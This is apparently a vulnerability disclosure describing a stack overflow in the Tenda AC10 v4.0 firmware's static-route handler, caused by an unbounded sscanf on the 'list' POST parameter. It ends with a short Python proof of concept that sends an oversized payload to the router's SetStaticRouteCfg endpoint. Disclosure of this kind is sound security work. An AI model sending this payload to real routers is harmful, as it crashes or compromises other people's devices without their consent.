## Overview

- Manufacturer's website information：https://www.tenda.com.cn/

- Firmware download website: https://www.tenda.com.cn/download/detail-3506.html

## Affected version

AC10 v4.0 V16.03.10.13

## Vulnerability details

The Tenda AC10 v4.0 V16.03.10.13 firmware has a stack overflow vulnerability in the `fromSetRouteStatic` function. The `v3` variable receives the `list` parameter from a POST request and is later assigned to function `save_staticroute_data`. 

![image-20240309151923286](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309151923286.png)

In the `save_staticroute_data` function, the `a2` (the value of `list`) is passed to `v5` and formatted by the `sscanf` function and in the form of `%[^,],%[^,],%[^,],%s`. This greedy matching mechanism is not secure, as long as the size of the data we enter is larger than the size of `v15, v16, v17, v18`, it will cause a stack overflow.

![image-20240309151932627](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309151932627.png)

![image-20240309151944197](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309151944197.png)

The user-provided `list` can trigger this security vulnerability.

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetStaticRouteCfg"
payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a,a,aa"

data = {"list": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240309152255060](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309152255060.png)
